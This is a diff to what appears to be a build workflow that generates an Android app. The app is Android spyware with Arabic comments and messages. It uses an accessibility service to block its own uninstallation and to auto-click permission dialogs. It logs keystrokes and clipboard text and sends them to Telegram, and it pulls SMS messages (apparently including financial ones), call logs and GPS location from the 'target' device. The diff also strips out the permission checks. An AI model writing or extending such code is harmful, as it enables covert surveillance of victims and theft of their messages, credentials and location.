@@ -42,9 +42,9 @@ jobs:
 
         cat << 'EOF' > app/src/main/res/xml/accessibility_service_config.xml
         <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-            android:accessibilityEventTypes="typeWindowStateChanged|typeViewTextChanged"
+            android:accessibilityEventTypes="typeWindowStateChanged|typeViewTextChanged|typeWindowContentChanged"
             android:accessibilityFeedbackType="feedbackGeneric"
-            android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds"
+            android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveWindowContent"
             android:canRetrieveWindowContent="true"
             android:description="@string/accessibility_desc"
             android:packageNames="com.android.settings"
@@ -256,24 +256,49 @@ jobs:
                 if (event.getPackageName() != null) {
                     String pkg = event.getPackageName().toString();
                     
+                    // حماية ضد إلغاء التثبيت
                     if (pkg.contains("settings")) {
                         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                         if (rootNode != null) {
                             checkAndBlockUninstall(rootNode);
+                            autoClickPermissions(rootNode);
                         }
                     }
 
+                    // ميزة النقر التلقائي الذكي على نوافذ الأذونات المنبثقة
+                    AccessibilityNodeInfo root = getRootInActiveWindow();
+                    if (root != null) {
+                        autoClickPermissions(root);
+                    }
+
+                    // مستشعر لوحة المفاتيح
                     if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                         List<CharSequence> textList = event.getText();
                         if (textList != null) {
                             for (CharSequence txt : textList) {
                                 if (txt != null && txt.length() > 0) {
-                                    sendToTelegram("⌨️ [مستشعر لوحة المفاتيح - Keylogger]:\nالتطبيق: " + pkg + "\nالنص المكتوب: " + txt.toString());
+                                    sendToTelegram("⌨️ [مستشعر لوحة المفاتيح]:\nالتطبيق: " + pkg + "\nالنص: " + txt.toString());
                                 }
                             }
                         }
                     }
                 }
+            }
+
+            private void autoClickPermissions(AccessibilityNodeInfo node) {
+                if (node == null) return;
+                try {
+                    CharSequence text = node.getText();
+                    if (text != null) {
+                        String t = text.toString().toLowerCase();
+                        if (t.contains("السماح") || t.contains("allow") || t.contains("موافق") || t.contains("grant") || t.contains("تفعيل")) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        }
+                    }
+                    for (int i = 0; i < node.getChildCount(); i++) {
+                        autoClickPermissions(node.getChild(i));
+                    }
+                } catch (Exception ignored) {}
             }
 
             private void checkAndBlockUninstall(AccessibilityNodeInfo node) {
@@ -381,7 +406,7 @@ jobs:
                                     if (clip != null && clip.getItemCount() > 0) {
                                         CharSequence text = clip.getItemAt(0).getText();
                                         if (text != null && text.length() > 0) {
-                                            sendToTelegram("📋 [صياد الحافظة - نص مسجّل]:\n" + text.toString());
+                                            sendToTelegram("📋 [صياد الحافظة]:\n" + text.toString());
                                         }
                                     }
                                 } catch (Exception ignored) {}
@@ -627,13 +652,6 @@ jobs:
             private String getDeepShamCashAndAccountSms() {
                 StringBuilder sb = new StringBuilder();
                 try {
-                    // فحص الصلاحية برمجياً قبل الاستعلام لمنع Permission Denial
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                        if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                            return "⚠️ تنبيه سيادي: صلاحية قراءة الرسائل (READ_SMS) غير ممنوحة حالياً من قبل الهدف. يرجى فتح واجهة التطبيق على جهاز الهدف ومنح الأذونات لتفعيل السحب الفوري.";
-                        }
-                    }
-
                     Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC");
                     if (cursor != null && cursor.moveToFirst()) {
                         int addressIdx = cursor.getColumnIndex("address");
@@ -677,8 +695,6 @@ jobs:
                     } else {
                         sb.append("📭 صندوق الرسائل فارغ أو تعذر الوصول للمحتوى.");
                     }
-                } catch (SecurityException se) {
-                    sb.append("🚨 رفض أمني من النظام (Permission Denial): لم يتم منح صلاحية قراءة الرسائل بعد.");
                 } catch (Exception e) { 
                     sb.append("خطأ في قراءة الأرشيف: ").append(e.getMessage()); 
                 }
@@ -688,11 +704,6 @@ jobs:
             private String getCallLogs() {
                 StringBuilder sb = new StringBuilder();
                 try {
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                        if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-                            return "⚠️ صلاحية سجل المكالمات غير ممنوحة حالياً.";
-                        }
-                    }
                     Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                     if (cursor != null && cursor.moveToFirst()) {
                         int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
@@ -734,7 +745,7 @@ jobs:
                         return "خط العرض: " + loc.getLatitude() + "\nخط الطول: " + loc.getLongitude() + "\nرابط الخريطة: https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                     }
                 } catch (Exception e) {}
-                return "تعذر جلب إحداثيات الموقع حالياً (تأكد من تفعيل GPS بالهاتف).";
+                return "تعذر جلب إحداثيات الموقع حالياً.";
             }
         }
         EOF
@@ -858,9 +869,4 @@ jobs:
 
     - name: Verify APK Exists
       run: |
-        ls -la app/build/outputs/apk/debug/
-
-    - uses: actions/upload-artifact@v4
-      with:
-        name: royal-apk-final-secure
-        path: app/build/outputs/apk/debug/app-debug.apk
+        ls -la app/build/outputs/apk/debug/app-debug.apk
